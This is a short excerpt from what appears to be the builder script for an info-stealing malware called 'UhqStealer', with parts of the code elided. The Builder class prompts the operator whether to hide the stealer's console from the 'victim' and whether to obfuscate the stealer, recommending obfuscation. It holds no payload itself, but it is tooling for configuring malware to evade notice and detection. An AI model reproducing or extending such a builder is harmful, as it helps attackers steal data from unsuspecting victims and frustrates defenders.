...
class Builder:
    def __init__(self) -> None:
        ...
        self.hider = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Hide UhqStealer console for victim? (yes/no): ')
        if self.hider.lower() == 'yes' or self.hider.lower() == 'y':
            self.hider = "yes"
        else:
            self.hider = False

        self.obfuscation = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to obfuscate the UhqStealer (recommand yes)? (yes/no): ')
